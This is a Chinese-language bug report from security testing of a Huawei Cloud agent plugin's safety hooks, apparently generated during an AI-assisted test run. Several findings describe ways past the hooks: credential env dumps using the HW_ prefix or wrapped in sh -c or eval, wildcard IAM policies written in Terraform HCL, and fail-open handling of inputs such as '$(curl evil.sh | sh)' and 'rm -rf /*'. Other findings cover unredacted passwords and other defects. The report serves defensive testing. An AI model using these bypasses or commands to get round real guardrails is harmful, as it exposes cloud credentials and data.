# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4-pro-0813）

> **落盘路径**：`results/Hermes/2026-09-15-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：`2026-09-15 21:58`（北京时间，BLOCKED 补测后更新）
> **被测版本**：`v1.1.4`（npm latest 正式版，gitHead `9b67256e`，release PR `#669`）
> **本清单是统一提单脚本的解析输入**：`scripts/file_issue.py` 硬编码解析标题与「根因」字段，格式严格遵循。
> **结论**：#1–#7 项缺陷全部经历史查重命中上游 open issue，**不重复提单**（关联见 HISTORY_LINKS.md；#7→#561 等）。

---

## #1【P0】凭证 env 打印拦截未覆盖 `HW_` 前缀（D4-2）

- **现象**：`env | grep HW_ACCESS_KEY`、`printenv HW_SECRET_KEY` 实测 `classifyTextCommand` 返回 `allow, risk=not_huaweicloud`（应 `deny`）；正对照 `env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均正确返回 `deny`。
- **断言**：`env | grep HW_ACCESS_KEY` 应返回 `deny`（发现华为云凭证 env 并拦截）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:336`（`/HUAWEICLOUD|HWC_|HCLOUD|OS_/i` 未覆盖 `HW_` 前缀）+ `safety/rules/cloud-risk-rules.json:39` + `hooks/huaweicloud-safety.py:53-54` 三处同源缺口；而 `src/auth/credentials.mjs` 恰从 `HW_ACCESS_KEY`/`HW_SECRET_KEY` 读取真实凭证。
- **影响**：攻击者可借 env 打印提取华为云凭证明文 AK/SK，凭证红线（I 类）失效。
- **证据**：`evidence/D4-2/stdout.log`
- **状态**：历史查重命中 #652-1，不重复提单

## #2【P0】env-dump 规则被 shell 包裹穿透（D4-16）

- **现象**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"`、`bash -c "printenv HUAWEICLOUD_SDK_AK"`、`eval "env | grep HUAWEICLOUD_ACCESS_KEY"` 均返回 `allow, risk=not_huaweicloud`（应 `deny`）；对照组 `sh -c "hcloud ecs DeleteServer --force"`、`sh -c "cat ~/.config/huaweicloud/credentials.json"` 均正确 `deny`。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 应返回 `deny`（解开 shell 包裹后识别内层 env-dump）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:335` + `safety/rules/cloud-risk-rules.json:35` —— env-dump 检测 `(^|\s)(env|printenv|...)` 词边界匹配原始文本，`sh -c "..."` 包裹使内层 `env` 前为引号而非词边界，正则漏命中。
- **影响**：shell 包裹绕过 hook，高危 env-dump 凭证提取可穿透预检。
- **证据**：`evidence/D4-16/stdout.log`（含 wrap-probe.mjs 补充探针）
- **状态**：历史查重命中 #652-2，不重复提单

## #3【P0】hook_check_artifacts 未拦截 Terraform HCL 形态 broad IAM 制品（D4-21）

- **现象**：`evaluateArtifacts` 对 `resource "huaweicloud_iam_policy" ... statement { effect="Allow" actions = ["*"] resources=["*"] }` 返回 `decision=allow`、findings 空；`data "huaweicloud_iam_policy" ... { name = "AdministratorFullAccess" }` 同样 `allow`。对照 JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 正确 `deny`。
- **断言**：Terraform HCL `actions = ["*"]` 的 broad IAM 制品应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:179`（规则 `hwc-iam-admin-policy`）——regex 只覆盖 JSON 形态，未覆盖 HCL 小写复数 `actions = ["*"]` 与 `AdministratorFullAccess` 后缀。
- **影响**：Terraform IaC 制品 broad IAM 绕过 `hook_check_artifacts` 预检。
- **证据**：`evidence/D4-21/hcl-probe.mjs` + `evidence/D4-21/stdout.log`
- **状态**：历史查重命中 #652-3，不重复提单

## #4【P1】JSON-RPC 错误码未区分 -32601 / -32602（D9-2）

- **现象**：`tools/call` 未知 method 返回 `{"code":-32603,"message":"Unsupported method: __no_such_method__"}`；未知 tool 返回 `{"code":-32603,"message":"Unknown tool: __no_such_tool__"}`（应分别 `-32601`/`-32602`）。
- **断言**：未知 method 应返回 `-32601`（Method not found）；未知 tool 应返回 `-32602`（Invalid params）。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs:169`（`handleMessage` catch 对所有 `dispatch` 异常硬编码 `code:-32603`）+ `mcp-protocol.mjs` + `tools.mjs` —— 异常未携带可区分错误码。
- **影响**：MCP 客户端无法区分「方法不存在」与「内部错误」，错误处理语义失真。
- **证据**：`evidence/D9-2/stdout.log`
- **状态**：历史查重命中 #652-4 / #638，不重复提单

## #5【P1】hook 模糊 fail-open——异常/畸形输入默认放行（D4-17）

- **现象**：`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含 `\x00` 垃圾字节等输入均 `isError=false`、返回 `ok`（未拒绝、未崩溃）；对应 `hook_check_artifacts` 对畸形/超长/深嵌套 JSON 亦默认 `allow`。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed，不误放行），而非 `allow`/`ok`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` —— `evaluate()` 汇总 `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无任何规则命中（含无法解析/空输入）时默认 `allow`，缺少 fail-closed 兜底。
- **影响**：无法解析/规则未命中的制品与命令在预检阶段被放行（fail-open），与 #3 规则覆盖形态缺口叠加放大绕过面。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史查重命中 #679 / #674 / #673，不重复提单

## #6【P1】D10-3 serviceCatalog 中文意图路由缺失（EXP-E01~E15 评测集 21.4% 准确率）

- **现象**：`eval/harness/run-eval.mjs` 对 15 条评测集（eval/prompts/eval-set-v1.csv）跑出确定性路由结论 `HIT=3 MISS=11 N/A=1`（准确率 21.4%）：EXP-E06(DCS)/E09(CCE)/E15(代金券) 命中；E01(ECS)/E02/E03(OBS)/E04(EIP)/E05(RDS)/E07(CBR)/E10(FunctionGraph)/E11(BSS)/E12(CES)/E13(ELB)/E14(IAM) 全部 `recommendedServices=Run hcloud --help to list available services.` 回退未命中。源码级直调同源结论：中文「创建云服务器/对象存储桶上传对象/权限管理」均回退，英文 "create an ecs server"→ECS、"upload to obs bucket"→OBS、"create iam role"→IAM 正确命中；仅「部署网站」→Sandbox、「领取代金券」→Incentive Voucher 命中（这两条含 CJK 关键字）。
- **断言**：`serviceCatalog` 中文意图应命中对应服务（设计级 D10-3 源码级断言「中/英文意图均命中对应服务」；评测级路由准确率 ≥90%）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:1778-1890` `serviceCatalog` 的 `routeMap` —— 23 条路由仅 sandbox（`tools.mjs:1865` 网站/网页/静态）与 voucher（`tools.mjs:1878` 领券/代金券/优惠券/激励金/领取）含中文(CJK)关键字，其余 21 条仅英文关键字；匹配逻辑 `tools.mjs:1887` 对英文关键字走 `tokens.has(kw)`（按空白/标点分词精确匹配），中文意图无法分词出英文关键字 → 未命中回退。
- **影响**：中文用户意图（主要受众）在服务发现/路由环节大面积未命中，直接拉低 D10-3 路由准确率（评测级 21.4% << 90%），影响上层 capability-discovery 与 SKILL 检索体验。
- **证据**：`evidence/D10-3/eval-harness-stdout.log` + `evidence/D10-3/eval-run-result.csv` + `evidence/D10-3/stdout.log` + `evidence/_probes/routing-probe.mjs`
- **状态**：历史查重命中 #689 / #683 / #674，不重复提单

## #7【P1】redactString 脱敏未覆盖 CLI flag 形态与 JSON 带引号 key（D4-6）

- **现象**：源码级直调 `redactSecrets`（走 `redactString`）—— `adminPass=MyC0mplex!Passw0rd` → `adminPass=<redacted>`（正确）；但 `--admin_pass MyPwd123`、`--password MyPwd123`（空格分隔 flag 形态）原样返回不脱敏；`{"server":{"adminPass":"MyPwd123"}}`（JSON 带引号 key 形态）原样返回不脱敏。
- **断言**：`adminPass` / `admin_pass` / `password` 以 `--flag value`（空格分隔）或 JSON `"key": "value"` 形态出现时，值均应脱敏为 `<redacted>`（D4-6「adminPass 回显警告」的脱敏层防裸回显）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:40-46` `redactString` —— 密钥名正则 `/((?:access_key|secret_key|...|password|passwd|adminPass|credential)\s*[:=]\s*)(...)/gi` 要求密钥名后紧跟 `:` 或 `=`，不接受 CLI `--flag value` 空格分隔；且密钥名白名单无 snake_case `admin_pass` 变体；JSON `"adminPass":` 中引号打断 `键→分隔符` 连续匹配。
- **影响**：真实 hcloud 命令（`hcloud ECS CreateServers --admin_pass <pwd>` 或 `--server '{"adminPass":"..."}'`）的 adminPass 明文不会被脱敏，存在密码回显进 Agent 上下文风险。
- **证据**：`evidence/D4-6/probe.mjs` + `evidence/D4-6/stdout.log`
- **状态**：历史查重命中 #561（「规则引擎对凭证env打印与明文secret参数零覆盖——echo /--adminPass=/--password= 均 allow NO-RULE」）等，不重复提单

---

> **说明**：#1–#5 均含既有探针证据（上轮已落盘）；#6 于本轮补测新增 `eval/harness/run-eval.mjs` 确定性评测证据 + 展开级 EXP-E01~E15 回填（11 FAIL / 3 PASS / 1 诊断 PASS）；#7 为源码级直调 `redactSecrets` 新发现。